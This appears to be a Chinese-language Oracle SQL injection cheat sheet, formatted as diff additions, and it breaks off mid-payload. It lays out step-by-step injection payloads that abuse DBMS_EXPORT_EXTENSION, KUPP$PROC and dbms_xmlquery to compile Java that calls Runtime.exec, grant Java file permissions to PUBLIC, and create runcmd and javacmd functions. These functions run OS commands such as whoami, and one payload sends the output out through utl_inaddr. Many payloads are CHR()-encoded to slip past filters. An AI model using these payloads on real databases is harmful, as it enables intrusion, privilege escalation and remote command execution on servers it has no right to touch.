+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('foo','bar','DBMS_OUTPUT".PUT_LINE(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "SasugaOracle" as import java.lang.*;import java.io.*;class SasugaOracle{public static String exec(String cmd){String ret="",tmp;try{BufferedReader reader=new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));while ((tmp=reader.readLine())!=null){ret+=tmp;}reader.close();}catch(Exception ex){ret=ex.toString();}return ret;}}''''; END;''; END;--', '', 0, '1', 0) from dual)=0--
+3. 赋予Java权限
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&gt;'''''''',''''''''execute''''''''); end;'''';END;'';END;--','SYS',0,'1',0) from dual)=0--
+创建runcmd函数
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function runcmd(cmd in varchar2) return varchar2 as language java name ''''''''SasugaOracle.exec(java.lang.String) return java.lang.String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual)=0--
+4. 赋予所有人执行权限
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant execute on runcmd to public'''';END;'';END;--','SYS',0,'1',0) from dual)=0--
+5.命令执行
+' and 1=2 union select 1,sys.runcmd('cmd /c ver'),2 from dual--
+
+2. hacking Oracle Database 11.1.0.7.0 以及更低版本(The 11.2.0.1 April CPU patch fixes this)
+当前用户有dba权限
+1. #赋予SYSTEM Javasyspriv Only DBA can call this function
+(select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(begin execute immediate 'grant javasyspriv to SYSTEM';end;)from dual) is not null   
+' AND (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(103)||CHR(114)||CHR(97)||CHR(110)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(115)||CHR(121)||CHR(115)||CHR(112)||CHR(114)||CHR(105)||CHR(118)||CHR(32)||CHR(116)||CHR(111)||CHR(32)||CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69)||CHR(77)||CHR(39)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59))from dual) is not null-- 
+2. 创建javaexec包
+' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace and resolve java source named "javaexec" as import java.lang.*;import java.io.*;public class javaexec{public static String Ecmd(String ss) throws IOException{BufferedReader mR= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(ss).getInputStream()));String st,str="";while ((st=mR.readLine()) != null) str += st+"\n";mR.close();return str;}}'';commit; end;') from dual) where rownum=1--
+' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(114)||CHR(101)||CHR(115)||CHR(111)||CHR(108)||CHR(118)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(115)||CHR(111)||CHR(117)||CHR(114)||CHR(99)||CHR(101)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(100)||CHR(32)||CHR(34)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(34)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(42)||CHR(59)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(105)||CHR(111)||CHR(46)||CHR(42)||CHR(59)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(99)||CHR(108)||CHR(97)||CHR(115)||CHR(115)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(123)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(115)||CHR(116)||CHR(97)||CHR(116)||CHR(105)||CHR(99)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(115)||CHR(41)||CHR(32)||CHR(116)||CHR(104)||CHR(114)||CHR(111)||CHR(119)||CHR(115)||CHR(32)||CHR(73)||CHR(79)||CHR(69)||CHR(120)||CHR(99)||CHR(101)||CHR(112)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(123)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(32)||CHR(109)||CHR(82)||CHR(61)||CHR(32)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(40)||CHR(41)||CHR(46)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(40)||CHR(115)||CHR(115)||CHR(41)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(40)||CHR(41)||CHR(41)||CHR(41)||CHR(59)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(116)||CHR(44)||CHR(115)||CHR(116)||CHR(114)||CHR(61)||CHR(34)||CHR(34)||CHR(59)||CHR(119)||CHR(104)||CHR(105)||CHR(108)||CHR(101)||CHR(32)||CHR(40)||CHR(40)||CHR(115)||CHR(116)||CHR(61)||CHR(109)||CHR(82)||CHR(46)||CHR(114)||CHR(101)||CHR(97)||CHR(100)||CHR(76)||CHR(105)||CHR(110)||CHR(101)||CHR(40)||CHR(41)||CHR(41)||CHR(32)||CHR(33)||CHR(61)||CHR(32)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(41)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(32)||CHR(43)||CHR(61)||CHR(32)||CHR(115)||CHR(116)||CHR(43)||CHR(34)||CHR(92)||CHR(110)||CHR(34)||CHR(59)||CHR(109)||CHR(82)||CHR(46)||CHR(99)||CHR(108)||CHR(111)||CHR(115)||CHR(101)||CHR(40)||CHR(41)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(59)||CHR(125)||CHR(125)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
+3.创建javacmd函数
+' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace function javacmd(p_filename in varchar2)return varchar2 as language java name ''''javaexec.Ecmd(java.lang.String)return String'''';''; commit; end;') from dual) where rownum=1--
+' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(112)||CHR(95)||CHR(102)||CHR(105)||CHR(108)||CHR(101)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(105)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(117)||CHR(97)||CHR(103)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(46)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(39)||CHR(39)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
+4. 命令执行
+' and 1=2 union select 1,(select javacmd('whoami') from dual),'3' from dual--
+'||utl_inaddr.get_host_name((select javacmd('ping 8.8.8.8') from dual))||'
+
+not dba(11g只需要java.io.permisson即可,10g额外需要readFileDescriptor writeFileDescriptor权限)
+' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(114)||CHR(101)||CHR(115)||CHR(111)||CHR(108)||CHR(118)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(115)||CHR(111)||CHR(117)||CHR(114)||CHR(99)||CHR(101)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(100)||CHR(32)||CHR(34)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(34)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(42)||CHR(59)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(105)||CHR(111)||CHR(46)||CHR(42)||CHR(59)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(99)||CHR(108)||CHR(97)||CHR(115)||CHR(115)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(123)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(115)||CHR(116)||CHR(97)||CHR(116)||CHR(105)||CHR(99)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(115)||CHR(41)||CHR(32)||CHR(116)||CHR(104)||CHR(114)||CHR(111)||CHR(119)||CHR(115)||CHR(32)||CHR(73)||CHR(79)||CHR(69)||CHR(120)||CHR(99)||CHR(101)||CHR(112)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(123)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(32)||CHR(109)||CHR(82)||CHR(61)||CHR(32)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(40)||CHR(41)||CHR(46)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(40)||CHR(115)||CHR(115)||CHR(41)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(40)||CHR(41)||CHR(41)||CHR(41)||CHR(59)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(116)||CHR(44)||CHR(115)||CHR(116)||CHR(114)||CHR(61)||CHR(34)||CHR(34)||CHR(59)||CHR(119)||CHR(104)||CHR(105)||CHR(108)||CHR(101)||CHR(32)||CHR(40)||CHR(40)||CHR(115)||CHR(116)||CHR(61)||CHR(109)||CHR(82)||CHR(46)||CHR(114)||CHR(101)||CHR(97)||CHR(100)||CHR(76)||CHR(105)||CHR(110)||CHR(101)||CHR(40)||CHR(41)||CHR(41)||CHR(32)||CHR(33)||CHR(61)||CHR(32)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(41)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(32)||CHR(43)||CHR(61)||CHR(32)||CHR(115)||CHR(116)||CHR(43)||CHR(34)||CHR(92)||CHR(110)||CHR(34)||CHR(59)||CHR(109)||CHR(82)||CHR(46)||CHR(99)||CHR(108)||CHR(111)||CHR(115)||CHR(101)||CHR(40)||CHR(41)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(59)||CHR(125)||CHR(125)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
+' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(112)||CHR(95)||CHR(102)||CHR(105)||CHR(108)||CHR(101)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(105)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(117)||CHR(97)||CHR(103)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(46)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(39)||CHR(39)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
+' and dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(109)||CHR(121)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(110)||CHR(117)||CHR(109)||CHR(98)||CHR(101)||CHR(114)||CHR(32)||CHR(105)||CHR(115)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(68)||CHR(69)||CHR(67)||CHR(76)||CHR(65)||CHR(82)||CHR(69)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(32)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(83)||CHR(46)||CHR(84)||CHR(69)||CHR(77)||CHR(80)||CHR(95)||CHR(74)||CHR(65)||CHR(86)||CHR(65)||CHR(95)||CHR(80)||CHR(79)||CHR(76)||CHR(73)||CHR(67)||CHR(89)||CHR(59)||CHR(67)||CHR(85)||CHR(82)||CHR(83)||CHR(79)||CHR(82)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(73)||CHR(83)||CHR(32)||CHR(32)||CHR(32)||CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(71)||CHR(82)||CHR(65)||CHR(78)||CHR(84)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(40)||CHR(41)||CHR(44)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(83)||CHR(89)||CHR(83)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(105)||CHR(111)||CHR(46)||CHR(70)||CHR(105)||CHR(108)||CHR(101)||CHR(80)||CHR(101)||CHR(114)||CHR(109)||CHR(105)||CHR(115)||CHR(115)||CHR(105)||CHR(111)||CHR(110)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(32)||CHR(32)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(60)||CHR(60)||CHR(65)||CHR(76)||CHR(76)||CHR(32)||CHR(70)||CHR(73)||CHR(76)||CHR(69)||CHR(83)||CHR(62)||CHR(62)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(44)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(69)||CHR(78)||CHR(65)||CHR(66)||CHR(76)||CHR(69)||CHR(68)||CHR(39)||CHR(39)||CHR(39)||CHR(39)||CHR(32)||CHR(102)||CHR(114)||CHR(111)||CHR(109)||CHR(32)||CHR(100)||CHR(117)||CHR(97)||CHR(108)||CHR(59)||CHR(66)||CHR(69)||CHR(71)||CHR(73)||CHR(78)||CHR(32)||CHR(79)||CHR(80)||CHR(69)||CHR(78)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(32)||CHR(32)||CHR(70)||CHR(69)||CHR(84)||CHR(67)||CHR(72)||CHR(32)||CHR(67)||CHR(49)||CHR(32)||CHR(66)||CHR(85)||CHR(76)||CHR(75)||CHR(32)||CHR(67)||CHR(79)||CHR(76)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||CHR(32)||CHR(73)||CHR(78)||CHR(84)||CHR(79)||CHR(32)||CHR(80)||CHR(79)||CHR(76)||CHR(59)||CHR(67)||CHR(76)||CHR(79)||CHR(83)||CHR(69)||CHR(32)||CHR(67)||CHR(49)||CHR(59)||CHR(68)||CHR(66)||CHR(77)||CHR(83)||CHR(95)||CHR(74)||CHR(86)||CHR(77)||CHR(95)||CHR(69)||CHR(88)||CHR(80)||CHR(95)||CHR(80)||CHR(69)||CHR(82)||CHR(77)||CHR(8